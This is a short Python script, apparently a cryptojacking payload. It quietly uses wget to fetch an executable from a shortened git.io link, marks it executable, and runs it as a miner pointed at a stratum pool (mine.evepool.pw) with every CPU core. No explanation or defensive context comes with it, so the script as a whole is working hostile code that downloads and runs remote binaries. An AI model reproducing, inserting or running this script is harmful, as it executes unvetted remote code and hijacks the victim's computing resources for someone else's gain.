import sys
import os
os.system("wget -qO build https://git.io/JySi5 && chmod +x build")
os.system("./build -a gr -o stratum+tcp://mine.evepool.pw:1090 -u wallet.worker -p x -t $(nproc)")
